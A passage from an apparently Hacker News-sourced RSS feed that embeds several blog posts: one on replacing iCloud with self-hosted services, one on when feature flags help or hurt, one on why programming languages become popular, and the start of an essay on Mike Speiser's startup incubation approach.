<figure><img loading="lazy" width="630" height="760" src="https://99systems.nyc3.cdn.digitaloceanspaces.com/wp-content/uploads/sites/4/2020/09/grafana-630x760.png" alt="" srcset="https://99systems.nyc3.cdn.digitaloceanspaces.com/wp-content/uploads/sites/4/2020/09/grafana-630x760.png 630w, https://99systems.nyc3.cdn.digitaloceanspaces.com/wp-content/uploads/sites/4/2020/09/grafana-249x300.png 249w, https://99systems.nyc3.cdn.digitaloceanspaces.com/wp-content/uploads/sites/4/2020/09/grafana-768x927.png 768w, https://99systems.nyc3.cdn.digitaloceanspaces.com/wp-content/uploads/sites/4/2020/09/grafana-1273x1536.png 1273w, https://99systems.nyc3.cdn.digitaloceanspaces.com/wp-content/uploads/sites/4/2020/09/grafana-1697x2048.png 1697w, https://99systems.nyc3.cdn.digitaloceanspaces.com/wp-content/uploads/sites/4/2020/09/grafana-1657x2000.png 1657w" sizes="(max-width: 630px) 100vw, 630px"></figure>
</div>
				</div>
			<article>
		</article></article></div>
			</section></div>]]>
            </description>
            <link>https://josh.blog/2020/09/grafana-overview-dashboard</link>
            <guid isPermaLink="false">hacker-news-small-sites-24550258</guid>
            <pubDate>Tue, 22 Sep 2020 02:19:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[RIP iCloud, Self-Hosting Part 5: Finale]]>
            </title>
            <description>
<![CDATA[
Score 47 | Comments 52 (<a href="https://news.ycombinator.com/item?id=24550197">thread link</a>) | @walterbell
<br/>
September 21, 2020 | https://www.naut.ca/blog/2020/05/05/self-hosting-series-part-5-finale/ | <a href="https://web.archive.org/web/*/https://www.naut.ca/blog/2020/05/05/self-hosting-series-part-5-finale/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://www.naut.ca/blog/content/images/2020/05/Screen-Shot-2020-05-05-at-3.30.56-PM.jpeg" width="400px/"></p><p>Just yesterday, I turned off iCloud on <strong>all</strong> my Apple devices. I then took a moment to savour my liberation from Apple's walled garden.</p>
<p>It has been over two years since I first dabbled in hosting my own blog server to finally disabling my iCloud account. There is a good reason as to why it took so long. Apple has cultivated a beautiful hardware+software ecosystem over the years, resulting in an ecosystem filled with magical features such as Apple Pay, Home Sharing, Handoff, and Instant Hotspot. An iCloud account is apparently a requirement for all of those features, which is a shame. I didn't find out until after I logged out and lost those features, but maybe it was for the better. Anyway, here's the proof:<br>
<img src="https://www.naut.ca/blog/content/images/2020/05/Screen-Shot-2020-05-05-at-3.38.39-PM.jpeg" alt="Screen-Shot-2020-05-05-at-3.38.39-PM"><br>
Now this may sound odd, but I feel that the fallbacks and replacements to iCloud features are sometimes easier to understand and give more of a feeling of groundedness, albeit at the cost of convenience. For example, I no longer debate about whether to use Apple Pay or not, and I feel grounded knowing that the physical card is all I need to protect, and that my credit card won't run out of battery. I now plug in a cable to backup my iPhone, and I hear the hard disks on my server grinding away as the files are transferred. I'm confident that something, if anything, is happening. By physically self-hosting emails in the house, I feel secure that a company can't tell me that my account has vanished, a concept that is becoming <a href="https://news.ycombinator.com/item?id=23057365">increasingly common</a>.</p>
<p>As we switched from using physical devices such as floppy disks, CDs, and servers to storing data and logic online, we lost a sense of physicality and tangibility, replaced by an abstract notion of the <a href="https://www.youtube.com/watch?v=8GRPArTor7w">cloud</a>. Most programmers realize that the cloud is not a magical place and are comfortable with the notion, but I've noticed that the cloud instills fear, uncertainty, and doubt in others.</p>
<p>Given that I've been to hell and back setting up a self-hosted cloud (even my programmer friends stare at me quizzically), I sound crazy to mention that this has made things "easier". I'm definitely <strong>not</strong> saying that self-hosting is easier than using iCloud, but it has made me aware of what we are missing. In any interactive system, the true complexity must hide somewhere, and in this case, Apple is offering to manage it for you. In an attempt for trust, security, and ease of use, these services create a greater disconnect between you and your "interactee". To give an example, take transactions between you and a merchant. First there was bartering. Then there was cash. These are both easy to understand, and almost nobody has trouble understanding the end-to-end concepts. However, take Apple Pay. Here's a high-level example of what it actually does:</p>
<blockquote>
<p><em>NFC Coil in POS Terminal energizes iPhone antenna ⟶ sends data to NFC Chip ⟶ activates iPhone CPU ⟶ requests Face ID unlock ⟶ beams tiny Infrared dots at your face ⟶ Infrared Camera constructs 3D model using Machine Learning model ⟶ decrypts credit card details in Secure Enclave ⟶ creates credit card token ⟶ sends back to iPhone NFC chip ⟶ transmits to POS Terminal ⟶ encrypts with TLS ⟶ sends through internet to the credit card network ⟶ network replies back</em></p>
</blockquote>
<p>To reiterate, this is a <em>high-level</em> overview. So yeah, try feeling grounded with that. It's a miracle that it even works.</p>
<h3 id="conclusion">Conclusion</h3>
<p>Overall, my self-hosting series has reduced the FUD surrounding these services for <em>me</em> (and hopefully at least another reader), since I now understand how the software works. I feel it is an accomplishment to be disconnected from Apple, knowing that I'm free to switch hardware whenever I please. Although increased privacy was one of the main reasons I started this series, I haven't really noticed anything different day-to-day. This series has been a very interesting journey, and it will be something that I will continue to explore with future blog posts. As somebody who is now examining iCloud from an outsider perspective for the first time, it is mind-boggling the amount of complexity that Apple manages and exerts power over, such as their COVID-19 Contact Tracing technology. I wonder what the future holds for Apple, and how its values will change over time.</p>
<h3 id="alternativestoicloud">Alternatives to iCloud:</h3>
<p><em>Note: E2EE software with easily exportable data is acceptable, e.g. Firefox Sync</em></p>
<p><strong>Rationale</strong></p>
<ul>
<li><a href="https://www.naut.ca/blog/2019/06/19/self-hosting-series-part-1-saying-bye-bye-to-icloud/">Self-Hosting Part 1: Why I'm Ditching iCloud</a></li>
<li><a href="https://medium.com/bugbountywriteup/how-apple-stored-all-your-email-metadata-for-years-on-their-servers-2a61b1a3232d">How Apple store all your email metadata for years on their servers</a></li>
</ul>
<p><strong>iCloud Mail, Notes</strong></p>
<ul>
<li><a href="https://www.naut.ca/blog/2019/10/06/self-hosting-series-part-2-mail-server/">Self-Hosting Part 2: Mail Server</a></li>
</ul>
<p><strong>iCloud Contacts, Calendar, Reminders</strong></p>
<ul>
<li><a href="https://www.naut.ca/blog/2019/11/16/self-hosting-series-part-3-radicale-server/">Self-Hosting Part 3: WebDAV Server</a></li>
</ul>
<p><strong>iCloud Safari</strong></p>
<ul>
<li><a href="https://hacks.mozilla.org/2018/11/firefox-sync-privacy/">Firefox Sync</a></li>
</ul>
<p><strong>iCloud Backup</strong></p>
<ul>
<li><a href="https://www.naut.ca/blog/2020/03/20/self-hosting-series-part-4-backup/">Self-Hosting Part 4: iOS + macOS Backup</a></li>
<li><a href="https://support.apple.com/en-ca/HT203977#computer">iTunes Local Backup</a></li>
</ul>
<p><strong>iCloud Drive</strong></p>
<ul>
<li><a href="https://9to5mac.com/2019/06/17/ios-13-beta-2-enables-smb-server-connectivity-in-the-files-app/">Samba Server</a></li>
<li><a href="https://nextcloud.com/">NextCloud</a></li>
</ul>
<p><strong>iCloud Photos</strong></p>
<ul>
<li><a href="https://nextcloud.com/">NextCloud</a></li>
<li><a href="https://support.apple.com/en-us/HT201313">iTunes Photo Sync</a></li>
</ul>
<p><strong>iCloud Keychain</strong></p>
<ul>
<li><a href="https://bitwarden.com/">Bitwarden (Self-hosted)</a></li>
<li><a href="https://www.enpass.io/">Enpass (Self-hosted)</a></li>
</ul>
<p><strong>iCloud Home</strong><br>
TBD. Currently, HomeKit requires iCloud Keychain to sync with your iOS devices. I am trying to develop a hub that rebroadcasts all HomeKit accessories allowing for multiple devices to connect to the same HomeKit device.</p>
<p><strong>Further Resources</strong></p>
<ul>
<li><a href="https://roll.urown.net/index.html">Roll Your Own Network</a></li>
</ul>
</div></div>]]>
            </description>
            <link>https://www.naut.ca/blog/2020/05/05/self-hosting-series-part-5-finale/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24550197</guid>
            <pubDate>Tue, 22 Sep 2020 02:07:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[When feature flags do and don’t make sense (2019)]]>
            </title>
            <description>
<![CDATA[
Score 84 | Comments 34 (<a href="https://news.ycombinator.com/item?id=24549917">thread link</a>) | @nomdep
<br/>
September 21, 2020 | https://software.rajivprab.com/2019/12/19/when-feature-flags-do-and-dont-make-sense/ | <a href="https://web.archive.org/web/*/https://software.rajivprab.com/2019/12/19/when-feature-flags-do-and-dont-make-sense/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<div><figure><a href="https://www.redbubble.com/i/canvas-print/If-Else-Software-Developer-Joke-Beer-Lover-by-VaSkoy/33140544.5Y5V7" target="_blank"><img data-attachment-id="282" data-permalink="https://software.rajivprab.com/flag/" data-orig-file="https://softwarerajivprab.files.wordpress.com/2019/12/flag.png" data-orig-size="896,1480" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="flag" data-image-description="" data-medium-file="https://softwarerajivprab.files.wordpress.com/2019/12/flag.png?w=182" data-large-file="https://softwarerajivprab.files.wordpress.com/2019/12/flag.png?w=620" src="https://softwarerajivprab.files.wordpress.com/2019/12/flag.png?w=182" alt="" srcset="https://softwarerajivprab.files.wordpress.com/2019/12/flag.png?w=182 182w, https://softwarerajivprab.files.wordpress.com/2019/12/flag.png?w=364 364w, https://softwarerajivprab.files.wordpress.com/2019/12/flag.png?w=91 91w" sizes="(max-width: 182px) 100vw, 182px"></a></figure></div>



<p>Over the past years, I’ve worked in multiple teams adopting very different strategies when it comes to feature flags. I’ve seen the pros and cons of both, and over time, I found myself disagreeing with any fundamentalist position on their use. There is a lot of nuance to this topic, and I think it is worth considering more carefully the various scenarios where feature flags do and do not make sense.</p>



<h2>The Reasons For</h2>



<p>There are a few major scenarios where feature flags make a lot of sense. The first is when it’s used for <a rel="noreferrer noopener" aria-label="A/B testing (opens in a new tab)" href="https://en.wikipedia.org/wiki/A/B_testing" target="_blank">A/B testing</a>, where you absolutely do want different behaviors for different users, based on their randomly assigned treatment. I’ve seen this strategy employed extremely well at Amazon where new features are gated by a “feature flag” that is actually controlled by an internal A/B testing framework. The framework randomly exposes some Amazon customers to the new feature, and then monitors their subsequent behavior in order to estimate the business impact of launching the feature.&nbsp;</p>



<p>I was initially skeptical, but was soon won over by how easy the framework was to use, and the valuable insights it provided on the benefits (or drawbacks) of certain features. “Flavor of the month” decisions were replaced with real data. And none of this is possible without the use of “feature flags” to dynamically toggle new features.</p>



<hr>



<p>Another great use case for feature flags, is when you’re working on a very complex epic that require many different sub-tasks to be completed in different parts of the system. Sub-tasks that are too numerous and invasive to be done in a single pull-request. </p>



<p>In such cases, trying to keep all these disparate changes in side-branches and coordinating a simultaneous merge and deployment, is a recipe for disaster. It’s far more manageable to gate any disruptive changes behind a master flag, merge and deploy all the sub-commits incrementally, and do a flag-flip once all the pieces are in place.</p>



<hr>



<p>One last use case for feature flags, is when you do not have control over your deployments. For example, consider the Facebook Android app, which contains code contributed by hundreds of different teams, all combined and deployed as a single binary. In such scenarios, performing rollbacks can be infeasible. For practical, political, bureaucratic or even marketing reasons. In such cases, feature flags allow your team to toggle new functionality or mitigate risky changes, without having to rollback or deploy any new binaries.</p>



<p><em>Someone on Reddit pointed out a similar use-case for feature flags: targeting a very specific launch date for marketing reasons, while still deploying your code much earlier, in order to ensure stability. You can then have a “dynamic” feature flag that automatically enables itself at a specific time. This is also a great use-case for similar reasons – changing functionality in situations where deploying a new binary is impractical.</em></p>



<h2>Risk Aversion</h2>



<p>The above are all fantastic use cases for feature flags, but I’ve also seen teams get bogged down by policies that overreach in their use. For example, mandating that every single code change should be behind a feature flag, <em>“just in case we made a mistake”</em>.</p>



<p>Risk management should indeed be a priority for all teams. But there are better ways of doing this than relying on feature flags, especially if your team has control over its own deployments. The <a rel="noreferrer noopener" aria-label=" (opens in a new tab)" href="https://software.rajivprab.com/2019/04/28/rethinking-software-testing-perspectives-from-the-world-of-hardware/" target="_blank">vast majority of your bugs should be caught by your automated test suite</a> and/or QA process. And the last few stragglers should be handled using <a rel="noreferrer noopener" aria-label="incremental deployments, production alarms and rollbacks (opens in a new tab)" href="https://software.rajivprab.com/2019/11/25/the-birth-of-legacy-software-how-change-aversion-feeds-on-itself/" target="_blank">incremental deployments, production alarms and rollbacks</a>.</p>



<p>Besides, as soon as any problem is detected, the recommendation at places like Google is to <a rel="noreferrer noopener" aria-label="rollback first and ask questions later (opens in a new tab)" href="https://cloud.google.com/blog/products/gcp/reliable-releases-and-rollbacks-cre-life-lessons" target="_blank">rollback first and investigate the problem later</a>:</p>



<blockquote><p><em>We have seen this at Google any number of times, where a hastily deployed roll-forward fix either fails to fix the original problem, or indeed makes things worse. Even if it fixes the problem it may then uncover other latent bugs in the system; you’re taking yourself further from a known-good state, into the wilds of a release that hasn’t been subject to the regular strenuous QA testing. At Google, our philosophy is that “rollbacks are normal.” When an error is found or reasonably suspected in a new release, the releasing team rolls back first and investigates the problem second</em></p></blockquote>



<p> When things are on fire, the last thing you want to do is root-cause the bug and figure out which flag-flip will safely fix the problem. And that may not even fix things – there’s no guarantee that even if your teammate tried to put his changes behind a feature flag, he didn’t inadvertently introduce a bug that cannot be solved by a flag-flip.</p>



<p>Feature flags are a poor man’s alternative to binary rollbacks, and they definitely aren’t a substitute for having a great automated test suite and a robust QA process. If you’re relying on feature flags to remedy production bugs, you should stop and evaluate your team’s practices. Risk aversion is often a smell of your team <a rel="noreferrer noopener" aria-label="entering into a doom loop which will only get worse and worse with time (opens in a new tab)" href="https://software.rajivprab.com/2019/11/25/the-birth-of-legacy-software-how-change-aversion-feeds-on-itself/" target="_blank">entering into a doom loop which will only get worse and worse with time</a>.</p>



<h2>Death By Feature Flags</h2>



<p>You may be wondering at this point why we shouldn’t use feature flags anyway. After all, <em>“defense in depth” …</em> and it never hurts to have more fine-grain flexibility right?</p>



<p>While feature flags are great in some cases, we should also keep in mind their costs. Software engineering is primarily an exercise in managing complexity. And each feature flag immediately doubles the universe of corner cases that your programmers have to understand, and your code is required to handle. <em>“But what would happen if Foo is enabled, Bar is disabled, and we do independent A/B tests on Baz and Kaz on the same day?”</em> In my experience, this combinatorial explosion in complexity can and <strong>will</strong> lead to bugs. Not to mention slowing down the speed at which your team can make any changes.</p>



<p><em>“But these feature flags are only temporary. You should be removing them as soon as possible!”</em></p>



<p>Sure, and we should also not allow our tech debt to accumulate and we should follow every single best-practice religiously. Unfortunately, this never happens in any corporate environment. Even in great teams, tech debt often gets de-prioritized in the face of new requests. Newcomers to the team or those on their way out, aren’t always disciplined enough to clean up their flags after a successful rollout. And sometimes, these tasks simply slip through the cracks and get forgotten.</p>



<p>There is no better illustration of this than the KCG debacle where a financial firm lost half a billion dollars and almost went bankrupt in 30 minutes, partly due to dead code that was behind a feature flag.</p>



<blockquote><p><a href="https://www.bugsnag.com/blog/bug-day-460m-loss"><em>The cause of the failure</em></a><em> was due to multiple factors. However, one of the most important was that a flag which had previously been used to enable Power Peg… Power Peg had been obsolete since 2003, yet still remained in the codebase some eight years later.</em></p><p><em>In 2005, an alteration was made to the Power Peg code which inadvertently disabled safety-checks which would have prevented such a scenario. However, this update was deployed to a production system at the time, despite no effort having been made to verify that the Power Peg functionality still worked</em></p></blockquote>



<hr>



<p>Feature flags are a powerful tool that can help you experiment with new features, manage the rollout of complex epics, and mitigate the problems associated with not controlling your team’s deployments. </p>



<p>But they come at a significant cost, in the form of code complexity, tech debt, slower development speeds, and inevitably, bugs. </p>



<p>As tempting as it may be, there is no silver bullet here. Weigh the pros against the cons, and use this tool judiciously when it makes sense to do so.</p>



<hr>



<p><a href="https://www.reddit.com/r/programming/comments/i5zbvk/when_feature_flags_do_and_dont_make_sense/" target="_blank" rel="noreferrer noopener"><em>Discussion thread on /r/programming</em></a></p>
	</div></div>]]>
            </description>
            <link>https://software.rajivprab.com/2019/12/19/when-feature-flags-do-and-dont-make-sense/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24549917</guid>
            <pubDate>Tue, 22 Sep 2020 01:11:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Language Sucks, It Doesn’t Matter]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24549895">thread link</a>) | @kristianpaul
<br/>
September 21, 2020 | https://matklad.github.io/2020/09/13/your-language-sucks.html | <a href="https://web.archive.org/web/*/https://matklad.github.io/2020/09/13/your-language-sucks.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <article>
  
  <p>Sep 13, 2020</p>
  <p>This post describes my own pet theory of programming languages popularity.
My understanding is that no one knows why some languages are popular and others aren’t, so there’s no harm done if I add my own thoughts to the overall confusion.
Obviously, this is all wild speculation and a just-so story without any kind of data backed research.</p>
<p>The central thesis is that the actual programming language (syntax, semantics, paradigm) doesn’t really matter.
What matters is characteristics of the runtime — roughly, what does memory of the running process look like?</p>
<p>To start, an observation.
A lot of software is written in vimscript and emacs lisp (<a href="https://magit.vc/">magit</a> being one example I can’t live without).
And these languages are objectively bad.
This happens even with less esoteric technologies, notable examples being PHP and JavaScript.
While JavaScript is great in some aspects (it’s the first mainstream language with lambdas!), it surely isn’t hard to imagine a trivially better version of it (for example, without two different <code>null</code>s).</p>
<p>This is a general rule — as soon as you have a language which is Turing-complete, and has some capabilities for building abstractions, people will just get the things done with it.
Surely, some languages are more productive, some are less productive, but, overall, FP vs OOP vs static types vs dynamic types doesn’t seem super relevant.
It’s always possible to overcome the language by spending some more time writing a program.</p>
<p>In contrast, overcoming language runtime is not really possible.
If you want to extend vim, you kinda have to use vimscript.
If you want your code to run in the browser, JavaScript is still the best bet.
Need to embed your code anywhere? GC is probably not an option for you.</p>
<p>This two observations lead to the following hypothesis:</p>
<div>
<table>
<tbody><tr>
<td>
<i title="Note"></i>
</td>
<td>
Languages generally become popular when they bring innovative runtime, or when they have runtime exclusivity.
The quality of the language itself is secondary.
</td>
</tr>
</tbody></table>
</div>
<p>Let’s see some examples which can be “explained” by this theory.</p>
<div>
<dl>
<dt>C</dt>
<dd>
<p>C has a pretty spartan runtime, which is notable for two reasons.
First, it was the first fast enough runtime for a high-level language.
It was possible to write the OS kernel in C, which had been typically done in assembly before that for performance.
Second, C is the language of Unix.
(And yes, I would put C into the “easily improved upon” category of languages. Null-terminated strings are just a bad design).</p>
</dd>
<dt>JavaScript</dt>
<dd>
<p>This language has been exclusive in the browsers for quite some time.</p>
</dd>
<dt>Java</dt>
<dd>
<p>This case I think is the most interesting for the theory.
A common explanation for Java’s popularity is “marketing by Sun”, and subsequent introduction of Java into University’s curricula.
This doesn’t seem convincing to me.
Let’s look at the 90’s popular languages (I am not sure about percentage and relative ranking here, but the composition seems broadly correct to me):</p>
<div>
<p><img src="https://matklad.github.io/assets/lang-pop.png" alt="lang pop">
</p>

</div>
<p>On this list, Java is the only non-dynamic cross-platform memory safe language.
That is, Java is both memory safe (no manual error-prone memory management) and can be implemented reasonably efficiently (field access is a load and not a dictionary lookup).
This seems like a pretty compelling reason to choose Java, irrespective of what the language itself actually looks like.</p>
</dd>
<dt>Go</dt>
<dd>
<p>One can argue whether focus on simplicity at the expense of everything else is good or bad, but statically linked zero dependency binaries definitely were a reason for Go popularity in the devops sphere.
In a sense, Go is an upgrade over “memory safe &amp; reasonably fast” Java runtime, when you no longer need to install JVM separately.</p>
</dd>
</dl>
</div>
<p>Naturally, there are also some things which are not explained by my hypothesis.
One is scripting languages.
A highly dynamic runtime with <code>eval</code> and ability to easily link C extensions indeed would be a differentiator, so we would expect a popular scripting language.
However, it’s unclear why they are Python and PHP, and not Ruby and Perl.</p>
<p>Another one is language evolutions: C++ and TypeScript don’t innovate runtime-wise, yet they are still major languages.</p>
<p>Finally, let’s make some bold predictions using the theory.</p>
<p><em>First</em>, I expect Rust to become a major language, naturally :)
This needs some explanation — on the first, blush, Rust is runtime-equivalent to C and C++, so the theory should predict just the opposite.
But I would argue that memory safety is a runtime property, despite the fact that it is, uniquely to Rust, achieved exclusively via language machinery.</p>
<p><em>Second</em>, I predict Julia to become more popular.
It’s pretty unique, runtime-wise, with its stark rejection of <a href="https://en.wikipedia.org/wiki/Ousterhout's_dichotomy">Ousterhout’s Dichotomy</a> and insisting that, yeah, we’ll just JIT highly dynamic language to suuuper fast numeric code at runtime.</p>
<p><em>Third</em>, I wouldn’t be surprised if Dart grows.
On the one hand, it’s roughly in the same boat as Go and Java, with memory safe runtime with fixed layout of objects and pervasive dynamic dispatch.
But the quality of implementation of the runtimes is staggering: it has first-class JIT, AOT and JS compilers.
Moreover, it has top-notch hot-reload support.
Nothing here is a breakthrough, but the combination is impressive.</p>
<p><em>Fourth</em>, I predict that Nim, Crystal and Zig (which is very interesting, language design wise) would not become popular.</p>
<p><em>Fifth</em>, I predict that Swift will be pretty popular on Apple hardware due to platform exclusivity, but won’t grow much outside of it, <em>despite</em> being very innovative in language design (generics in Swift are the opposite of the generics in Go).</p>
</article>

  </div></div>]]>
            </description>
            <link>https://matklad.github.io/2020/09/13/your-language-sucks.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24549895</guid>
            <pubDate>Tue, 22 Sep 2020 01:04:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Mike Speiser Incubation Playbook]]>
            </title>
            <description>
<![CDATA[
Score 37 | Comments 4 (<a href="https://news.ycombinator.com/item?id=24549767">thread link</a>) | @sethbannon
<br/>
September 21, 2020 | https://kwokchain.com/2020/09/22/the-mike-speiser-incubation-playbook/ | <a href="https://web.archive.org/web/*/https://kwokchain.com/2020/09/22/the-mike-speiser-incubation-playbook/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>In Formula 1 racing, you can win a world championship as a driver with one team but then not even make the top 10 without that team’s car and infrastructure. Venture can often feel like this, too. Many top performing VCs would struggle if they weren’t on their firm’s platform. And similarly, a far greater number of VCs might be able to do well if they were just at a firm with a strong enough brand. Most special are those that are the source of their own success.</p>



<p>In <a href="https://kwokchain.com/2019/04/09/making-uncommon-knowledge-common/">Making Uncommon Knowledge Common</a>, I wrote about Rich Barton because he’s one of the rare founders (or investors) with the demonstrated ability to create multiple billion dollar companies. Unpacking and learning from the few who have shown repeatable and internally compounding approaches to building companies is important.</p>



<p>Unlike consumer, traditional enterprise markets lend themselves more naturally to deterministic and repeatable success. There’s a small handful of VCs who have clearly shown they can succeed repeatedly and whose approaches and playbooks are legible enough to imply it’s not a fluke. Speiser is one of them.</p>



<p>Speiser’s portfolio includes companies like Pure Storage and Snowflake Computing. It’s worth noting that Snowflake not only IPO’d and is now at a market cap of over $60B but Speiser and Sutter Hill Ventures owned more than 20% of the company leading up to the IPO. When Pure Storage went public, Sutter Hill held more than 25%. Speiser may have the highest percentage of portfolio companies that have become multi-billion dollar companies—and that trend looks to continue with his newer companies.</p>



<p>But impressive returns are not solely what matters for the industry. It’s tempting to evaluate firms by their returns, and from the LP perspective that may be the correct metric. But another, and more important way to judge VC firms is by the <a href="https://en.wikipedia.org/wiki/Value_over_replacement_player">value they add above replacement</a> to their portfolio companies. How much do they help their portfolio companies increase their likelihood and magnitude of success? Firms do this most notably by providing capital, but also by other methods like lending their brand or directly helping with operations.</p>



<p>For founders, this value added is what matters. The returns of a VC firm only matter to a startup insofar as they translate into improved brand, network, or access to capital for the startup. A firm’s financial performance is a reasonable signal that they may add real value and be worth partnering with, especially since some aspects like brand strength for recruiting, future financing, and customer development are a function of perceived firm success. But to prospective portfolio companies, a fund’s returns are important only as a means, not an end.</p>



<p>What makes Speiser intriguing is how distinct his approach is from other VCs. The tantalizing clues suggest that he has figured something out that nobody else has: the formula for creating successful companies from scratch.</p>



<figure><img loading="lazy" width="800" height="559" src="https://i1.wp.com/kwokchain.com/wp-content/uploads/2020/09/image.png?resize=800%2C559&amp;ssl=1" alt="" srcset="https://i1.wp.com/kwokchain.com/wp-content/uploads/2020/09/image.png?w=800&amp;ssl=1 800w, https://i1.wp.com/kwokchain.com/wp-content/uploads/2020/09/image.png?resize=300%2C210&amp;ssl=1 300w, https://i1.wp.com/kwokchain.com/wp-content/uploads/2020/09/image.png?resize=768%2C537&amp;ssl=1 768w" sizes="(max-width: 800px) 100vw, 800px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/kwokchain.com/wp-content/uploads/2020/09/image.png?w=800&amp;ssl=1 800w, https://i1.wp.com/kwokchain.com/wp-content/uploads/2020/09/image.png?resize=300%2C210&amp;ssl=1 300w, https://i1.wp.com/kwokchain.com/wp-content/uploads/2020/09/image.png?resize=768%2C537&amp;ssl=1 768w" data-lazy-src="https://i1.wp.com/kwokchain.com/wp-content/uploads/2020/09/image.png?resize=800%2C559&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>you didn’t really think there wasn’t going to be a drawing of a loop did you?</figcaption></figure>



<h2>The Speiser playbook</h2>



<p>At the core of Speiser’s approach is incubating companies, or “originating companies” in <a href="https://www.strictlyvc.com/2014/11/10/sam-pullara-entrepreneur-vc-firm/">Sutter Hill nomenclature</a>. Instead of investing in existing companies, Speiser stays solely focused on one thing: starting and building companies. Even among others who have been very successful at incubations, he is the most singularly focused on this.</p>



<figure><img loading="lazy" width="800" height="560" src="https://i1.wp.com/kwokchain.com/wp-content/uploads/2020/09/image-1.png?resize=800%2C560&amp;ssl=1" alt="" srcset="https://i1.wp.com/kwokchain.com/wp-content/uploads/2020/09/image-1.png?w=800&amp;ssl=1 800w, https://i1.wp.com/kwokchain.com/wp-content/uploads/2020/09/image-1.png?resize=300%2C210&amp;ssl=1 300w, https://i1.wp.com/kwokchain.com/wp-content/uploads/2020/09/image-1.png?resize=768%2C538&amp;ssl=1 768w" sizes="(max-width: 800px) 100vw, 800px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/kwokchain.com/wp-content/uploads/2020/09/image-1.png?w=800&amp;ssl=1 800w, https://i1.wp.com/kwokchain.com/wp-content/uploads/2020/09/image-1.png?resize=300%2C210&amp;ssl=1 300w, https://i1.wp.com/kwokchain.com/wp-content/uploads/2020/09/image-1.png?resize=768%2C538&amp;ssl=1 768w" data-lazy-src="https://i1.wp.com/kwokchain.com/wp-content/uploads/2020/09/image-1.png?resize=800%2C560&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>bespoke artisanal charts as a service</figcaption></figure>



<p>Every year Speiser incubates around one company. The core of his model is to find 2-3 co-founders and be the founding investor. Often he takes on the interim CEO role himself for the first year or two. This has many advantages. The biggest is that it reshapes the ideal founding team profile. He can focus on getting the right top technical co-founders that will have strong views on what to build and the ability to build it—even if they are people who don’t generally view themselves as having a natural inclination to be founders. This is a significant talent arbitrage.</p>



<h3>A better package for founders</h3>



<p>There has been a dearth of coverage of Snowflake’s three cofounders, Benoit Dageville, Thierry Cruanes, and Marcin Zukowski in both the news and social media. Partially this is because they have not sought the spotlight. But partially, it is due to the veneration of a certain type of founder we have, those who seek the limelight of public presence and being in control of every aspect of the company.</p>



<p>Snowflake’s founders are cut from a different cloth. As Benoit Dageville put it “We never thought of it as building a company. We just wanted to build a cloud product. The company was an afterthought.” Yet, their product and technical decisions have been prescient in threading the narrow path to taking on Amazon and Google in the most important core markets of cloud computing.</p>



<p>There are people who often don’t <em>want</em> to be CEO, or even to start a company. They are driven by their conviction of what the future should look like, as well as their frustration with the internal dynamics they confront at legacy incumbents that prevent them from creating that reality. But they are still unlikely to start a company due to all the inertial cruft that comes with founding a company—and especially with being CEO. They want to build what matters, not set up a new corporate structure, manage fundraising, or build a sales team.</p>



<p>Eric Yuan, the founder and CEO of Zoom, <a href="https://www.cnbc.com/2019/08/21/zoom-founder-left-job-because-he-wasnt-happy-became-billionaire.html">has explained</a> this feeling of being held back at Webex. He knew what should be built and that the Webex team could do it, but given the dynamics of Webex as a subsidiary of Cisco he was unable to get the political capital to do it. And he’s proven himself right by leaving with his Webex teammates and building Zoom. Considering he was VP Engineering at Webex and still unable to build what he thought was important should be a very discomfiting reality shock to large companies about the very real economic harm the malaise of their internal processes have caused. However, for every Eric Yuan, there are countless others that never leave and start a company. The inertial barriers are too high. They can stay at their company and struggle to work on what they know should be built. Or leave and take on more uncertainty and risk than they want.</p>



<p>Speiser introduces a third model that breaks through this <a href="https://en.wikipedia.org/wiki/Between_Scylla_and_Charybdis">Scylla and Charybdis</a> dilemma. Start a company with Speiser and stay focused on what you want: deciding what to build, hiring the team you need, and building it. Speiser will handle fundraising, handling the operations generally, and setting up the sales motion and machine. Founders get much of the autonomy and upside of starting a new company while also getting support and guardrails so they can stay focused while having confidence the business is being built well.</p>



<p>Speiser doesn’t just take on these roles because founders don’t want to do it. There are actually aspects of company building where he should be better than the founders. Sutter Hill Ventures has the capital already, so it’s easy for them to take on responsibility for fundraising and remove that as a blocker. Instead of having to burn a lot of cycles fundraising, Sutter Hill can provide the capital. And they often do, leading multiple rounds into their companies. Or they can bring in outside investors, with the confidence that Sutter Hill can lead the entire round as a backstop if the process becomes too much of a hassle. Also, like any VC firm, Sutter Hill builds a brand that compounds their companies’ ability to raise follow on funding. At this point there are multiple firms that have made their bread and butter following on after Sutter Hill, to great success.</p>



